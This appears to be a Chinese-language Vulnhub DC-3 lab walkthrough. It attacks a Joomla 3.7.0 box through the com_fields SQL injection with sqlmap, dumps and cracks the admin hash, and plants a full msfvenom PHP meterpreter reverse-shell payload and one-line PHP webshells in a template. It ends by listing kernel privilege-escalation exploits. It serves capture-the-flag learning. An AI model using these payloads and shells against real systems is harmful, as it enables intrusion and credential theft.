---
title: DC3 walk-through/learning notes
date: 2020-11-27 +0800
categories: [pentest-learning,Vulnhub]
tags: [ctf,sql]
---

# 小心探测



## 二话不说 先上扫描



```bash
$ rustscan 192.168.31.154 --ulimit 5000  -- -A              
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛
[~] The config file is expected to be at "/Users/esonhugh_skyworship/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.31.154:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -vvv -p 80 192.168.31.154

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 12:22 CST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
Initiating Ping Scan at 12:22
Scanning 192.168.31.154 [2 ports]
Completed Ping Scan at 12:22, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:22
Completed Parallel DNS resolution of 1 host. at 12:22, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:22
Scanning 192.168.31.154 [1 port]
Discovered open port 80/tcp on 192.168.31.154
Completed Connect Scan at 12:22, 0.00s elapsed (1 total ports)
Initiating Service scan at 12:22
Scanning 1 service on 192.168.31.154
Completed Service scan at 12:22, 6.05s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.31.154.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.52s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
Nmap scan report for 192.168.31.154
Host is up, received syn-ack (0.0018s latency).
Scanned at 2020-11-01 12:22:30 CST for 7s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds


$ gobuster dir -u http://192.168.31.154/ -w wordlist_of_dir.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.31.154/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist_of_dir.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/01 14:38:44 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [-->
http://192.168.31.154/images/]
/media                (Status: 301) [Size: 316] [--> http://192.168.31.154/media/] 
/templates            (Status: 301) [Size: 320] [--> http://192.168.31.154/templates/]
/modules              (Status: 301) [Size: 318] [--> http://192.168.31.154/modules/]  
/bin                  (Status: 301) [Size: 314] [--> http://192.168.31.154/bin/]      
/plugins              (Status: 301) [Size: 318] [--> http://192.168.31.154/plugins/]  
/includes             (Status: 301) [Size: 319] [--> http://192.168.31.154/includes/] 
/language             (Status: 301) [Size: 319] [--> http://192.168.31.154/language/] 
/components           (Status: 301) [Size: 321] [--> http://192.168.31.154/components/]
/cache                (Status: 301) [Size: 316] [--> http://192.168.31.154/cache/]     
/libraries            (Status: 301) [Size: 320] [--> http://192.168.31.154/libraries/] 
/tmp                  (Status: 301) [Size: 314] [--> http://192.168.31.154/tmp/]       
/layouts              (Status: 301) [Size: 318] [--> http://192.168.31.154/layouts/]   
/administrator        (Status: 301) [Size: 324] [--> http://192.168.31.154/administrator/]
/cli                  (Status: 301) [Size: 314] [--> http://192.168.31.154/cli/]          
/server-status        (Status: 403) [Size: 302]                                                                       
===============================================================

```

根据扫描结果 我们可以得到以下几个细节

这就是一个只有80口传入传出http网站数据的盒子 joolma!的CMS 支持GET POST HEAD方法

可以大胆猜测 运行着标准的LAMP环境。Linux 、apache 、mysql、php



## 网站初探

curl或者使用web broswer直接查看 网站 可以发现 作者并有没给予提示 robots.txt也是不存在什么敏感信息的。

这里就不加以演示了。



## 寻找漏洞

利用metasploit 可以通过辅助插件来进行一些探测 例如一些版本探测和更多的细节

msf的辅助插件对于漏洞的探测非常给力的还是

```zsh
msf6 > search joomla

Matching Modules
================

   #   Name                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                    ---------------  ----       -----  -----------
   0   auxiliary/admin/http/joomla_registration_privesc        2016-10-25       normal     Yes    Joomla Account Creation and Privilege Escalation
   1   auxiliary/gather/joomla_com_realestatemanager_sqli      2015-10-22       normal     Yes    Joomla Real Estate Manager Component Error-Based SQL Injection
   2   auxiliary/gather/joomla_contenthistory_sqli             2015-10-22       normal     Yes    Joomla com_contenthistory Error-Based SQL Injection
   3   auxiliary/gather/joomla_weblinks_sqli                   2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
   4   auxiliary/scanner/http/joomla_bruteforce_login                           normal     No     Joomla Bruteforce Login Utility
   5   auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner  2015-03-20       normal     No     Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner
   6   auxiliary/scanner/http/joomla_gallerywd_sqli_scanner    2015-03-30       normal     No     Gallery WD for Joomla! Unauthenticated SQL Injection Scanner
   7   auxiliary/scanner/http/joomla_pages                                      normal     No     Joomla Page Scanner
   8   auxiliary/scanner/http/joomla_plugins                                    normal     No     Joomla Plugins Scanner
   9   auxiliary/scanner/http/joomla_version                                    normal     No     Joomla Version Scanner
   10  exploit/multi/http/joomla_http_header_rce               2015-12-14       excellent  Yes    Joomla HTTP Header Unauthenticated Remote Code Execution
   11  exploit/unix/webapp/joomla_akeeba_unserialize           2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
   12  exploit/unix/webapp/joomla_comfields_sqli_rce           2017-05-17       excellent  Yes    Joomla Component Fields SQLi Remote Code Execution
   13  exploit/unix/webapp/joomla_comjce_imgmanager            2012-08-02       excellent  Yes    Joomla Component JCE File Upload Remote Code Execution
   14  exploit/unix/webapp/joomla_contenthistory_sqli_rce      2015-10-23       excellent  Yes    Joomla Content History SQLi Remote Code Execution
   15  exploit/unix/webapp/joomla_media_upload_exec            2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
   16  exploit/unix/webapp/joomla_tinybrowser                  2009-07-22       excellent  Yes    Joomla 1.5.12 TinyBrowser File Upload Code Execution


Interact with a module by name or index. For example info 16, use 16 or use exploit/unix/webapp/joomla_tinybrowser
```

反正插件也不多 setg rhosts 为我们的目标机器 全部use一遍也不是问题。

前几个都不行虽然都不行 但是依旧看起来joomla受插件的sql注入问题很严重 前面几个都是sqli

主要的信息都在 789  三个扫描插件了

```zsh
msf6 > use 7
msf6 auxiliary(scanner/http/joomla_pages) > run

[+] 192.168.31.154:80     - Page Found: /administrator/index.php
[+] 192.168.31.154:80     - Page Found: /htaccess.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/http/joomla_pages) > use 8
msf6 auxiliary(scanner/http/joomla_plugins) > run

[+] Plugin: /?1.5.10-x 
[+] Plugin: /?1.5.11-x-http_ref 
[+] Plugin: /?1.5.11-x-php-s3lf 
[+] Plugin: /?1.5.3-path-disclose 
[+] Plugin: /?1.5.3-spam 
[+] Plugin: /?1.5.8-x 
[+] Plugin: /?1.5.9-x 
[+] Plugin: /?j1012-fixate-session 
[+] Plugin: /administrator/ 
[+] Plugin: /administrator/components/ 
[+] Plugin: /administrator/components/com_admin/ 
[+] Plugin: /administrator/index.php?option=com_djartgallery&task=editItem&cid[]=1'+and+1=1+--+ 
[+] Plugin: /administrator/index.php?option=com_searchlog&act=log 
[+] Plugin: /components/com_ajax/ 
[+] Plugin: /components/com_banners/ 
[+] Plugin: /components/com_biblestudy/ 
[+] Page: /index.php?option=com_biblestudy
[+] Plugin: /components/com_contact/ 
[+] Page: /index.php?option=com_contact
[+] Plugin: /components/com_content/ 
[+] Page: /index.php?option=com_content
[+] Plugin: /components/com_contenthistory/ 
[+] Plugin: /components/com_fields/ 
[+] Plugin: /components/com_finder/ 
[+] Page: /index.php?option=com_finder
[+] Plugin: /components/com_mailto/ 
[+] Plugin: /components/com_media/ 
[+] Plugin: /components/com_newsfeeds/ 
[+] Page: /index.php?option=com_newsfeeds
[+] Plugin: /components/com_search/ 
[+] Page: /index.php?option=com_search
[+] Plugin: /components/com_users/ 
[+] Page: /index.php?option=com_users
[+] Plugin: /components/com_wrapper/ 
[+] Page: /index.php?option=com_wrapper
[+] Plugin: /index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&amp;type=css&v=1 
[+] Vulnerability: Potential LFI
[+] Plugin: /index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users-- 
[+] Page: /index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/http/joomla_plugins) > use 9
msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.18 (Ubuntu)
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

别的东西问题都不是很大 比如说htaccess.txt很明显是想要ban掉xss

问题是后面一个检查中好像都用到了sql语句

如：

```bash
[+] Plugin: /administrator/index.php?option=com_djartgallery&task=editItem&cid[]=1'+and+1=1+--+ 
#^此处是sql
[+] Plugin: /index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&amp;type=css&v=1 
[+] Vulnerability: Potential LFI
#^此处是路径包含
[+] Plugin: /index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users-- 
[+] Page: /index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos
#^此处是两个sql注入
```



心生好奇于是就打开了对应的地址 ok 404了

很明显 兔子洞 上面7 8两个查询结果是都不可利用的

就剩下 9 的joomla版本号了

seachsploit轮到你了

```bash
$ searchsploit joomla 3.7.0
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Inject | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21  | php/webapps/43488.txt
---------------------------------------- ---------------------------------
Shellcodes: No Results
```



既然只有sql这一条路了 那就看看他写了什么吧

```bash
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap: 
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)%
```

好家伙 写的非常详细 这波 这波 就马上开始漏洞利用

# 利用！sqlmap 偷密码！



怎么用 当然是sqlmap啊 还用问 难不成手动一个个去试这个基于时间错误盲注 布尔盲注？

当然是 直接用txt里给出的sqlmap语句一把梭

```bash
sqlmap -u "http://<ip there>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
#但是反正是靶机嘛 我建议使用下面一句 获取信息更快更多
$ sqlmap -u "http://192.168.31.154/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list\[fullordering\] --is-dba --privileges --current-user --sql-sell
```

在漫长的sql扫描的等待之后 就可以直接获取一堆信息 然后拿到目前所有的权限信息和交互式sql shell

如下面所示：

```bash
sqlmap -u "http://192.168.31.154/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list\[fullordering\] --is-dba --privileges --current-user --sql-shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:26:16 /2020-11-28/

[10:26:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; hu; rv:1.8.1.1) Gecko/20061208 Firefox/2.0.0.1' from file '/usr/local/Cellar/sqlmap/1.4.11/libexec/data/txt/user-agents.txt'
[10:26:17] [INFO] resuming back-end DBMS 'mysql' 
[10:26:17] [INFO] testing connection to the target URL
[10:26:17] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=966jjpfse3j...pbup6k6n15'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(5334,CONCAT(0x2e,0x716a787871,(SELECT (ELT(5334=5334,1))),0x7162626a71),6718))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2791 FROM (SELECT(SLEEP(5)))LrOm)
---
[10:26:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.1
[10:26:19] [INFO] fetching current user
[10:26:19] [INFO] resumed: 'root@localhost'
current user: 'root@localhost'
[10:26:19] [INFO] testing if current user is DBA
[10:26:19] [INFO] fetching current user
current user is DBA: True
[10:26:19] [INFO] fetching database users privileges
database management system users privileges:
[*] 'debian-sys-maint'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] 'mysql.session'@'localhost' (administrator) [1]:
    privilege: SUPER
[*] 'mysql.sys'@'localhost' [1]:
    privilege: USAGE
[*] 'root'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE

[10:26:19] [INFO] fetching database names
[10:26:19] [INFO] resumed: 'information_schema'
[10:26:19] [INFO] resumed: 'joomladb'
[10:26:19] [INFO] resumed: 'mysql'
[10:26:19] [INFO] resumed: 'performance_schema'
[10:26:19] [INFO] resumed: 'sys'
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

[10:26:19] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> _
```

通过一些系列查询 去查询数据库的tables等信息

最后！ 我们可以通过以下语句拿出一些东西

```bash
#(我忘记了这句的查询是什么了 我记得我好像暴力的dump了 joomladb的数据库结构 然后查询user 就找到了这个结构)
Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| params   | non-numeric |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+

select id,name,username,password,email,params from #__users [1]:
[*] 629, admin, admin, $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu, freddy@norealaddress.net, {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""}
```



现在我们拿到了密码的hash 我想了半天 想不到如何解决 这一看就知道这是加了salt的 我也没办法cover它 只能硬着头皮破。。于是就

```bash
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > pass
#注意 此处 不可使用双引号 $是shell变量的标识符 如果使用双引号就会导致 shell先查询变量再导入 文件pass 会导致不可预见的错误
john pass

```

根据爆破的结果可以直接拿出密码 snoopy

直接登陆admin 

ip-address/adminstrator/index.php

成功

# SHELL！命运的分叉口！

yysy 我真得是有点馋那个root权限的mysql想用sql直接拿shell 但是很无奈的是

无论是--os-pwn还是system执行都是不可行的 尝试了多次 均以失败告终 目录似乎不可写的样子

但是我们进入了web站点是真。 而且是管理员级别

问题不大 

那么开始查询有没有什么常见的可以利用的点 比如说CMS系统下的模版 主题 插件 这几个关键的在线可编辑的点

在一番闲逛了网站之后 于是 我准备用cms常见方法 在线编辑模版进行getshell

我先调整了一个config 让我可以preview模板

然后借助一下

```bash
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.31.50 lport=4444
```

生成了一段php meterpreter

```php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes

/*<?php /**/ error_reporting(0); $ip = '192.168.31.50'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

然后copy出来一份模板 

本来是打算upload php file然后自己去触发meterpreter的 但是后来发现死活是找不到（可能要在模板文件夹下触发这个php）

然后就改为在index下多添加一段恶意code

（其实还尝试过 添加一句话木马 

```php
eval($_GET['shell']);
exec($_GET['shell']);
system($_GET['shell']);
```

这样的一句话木马 但是为了多学一点嘛 去创建了一个php meterpreter

ok然后在本地启动我的msf

```bash
msfconsole
use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
#这里设置了一个 有效载荷 所谓payload 是我们刚才在编辑模版这里的 php meterpreter
msf6 exploit(multi/handler) > set lhost 192.168.31.50
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
#这里是启动了监听模式
```

然后浏览一下index.php就直接可以看到连接上了我的shell

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.31.50:4444 
[*] Sending stage (39282 bytes) to 192.168.31.154
[*] Meterpreter session 1 opened (192.168.31.50:4444 -> 192.168.31.154:42044) at 2020-11-28 23:42:44 +0800

meterpreter > help
```

这里就不得不讲述一个技巧了

因为运行sudo -l指令失败 表示没有tty是完全不行的

于是python生成伪终端的方法

```bash
python -c "import pty;pty.spawn("/bin/bash")"
  File "<string>", line 1
    import pty;pty.spawn(/bin/bash)
                         ^
SyntaxError: invalid syntax
#这里的“会导致错误的语法 所以只能换成单引号
python -c "import pty;pty.spawn('/bin/bash')"   
```



# 提权！恶魔的开始！

这里我寻找了sudo 发现sudo -l也要输入密码 NOPASSWORD看起来似乎不太可能

```bash
# SUID位查找
www-data@DC-3:/var/www/html/templates$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping6
/bin/ntfs-3g
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/at
```

[SUID wrong config](https://gtfobins.github.io/#+suid)一顿查找 一顿操作猛如虎 回头一看0-5

有什么办法嘛？ 想了想

这是19年产的靶机 已经过期了很久了 ubuntu还在16.04LTS 感觉好像可以内核提权喔

seachsploit赶紧一看 好家伙！

```bash
$ searchsploit ubuntu 16.04
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                                      | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                         | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Dr | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                             | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - ' | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Cla | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                 | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary File Read             | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                       | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                    | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation      | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalati | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Esca | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation          | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                            | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                         | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation     | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP) | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escal | linux/local/47169.c
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

现在需要仔细看看 系统的一些信息了	

```bash
uname -a
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
```

4.4.0-21好家伙

```bash
$ searchsploit ubuntu 16.04 4.4.0-21
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                  | linux/dos/43234.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalati | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Esca | windows_x86-64/local/47170.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                         | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation     | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP) | linux/local/43418.c
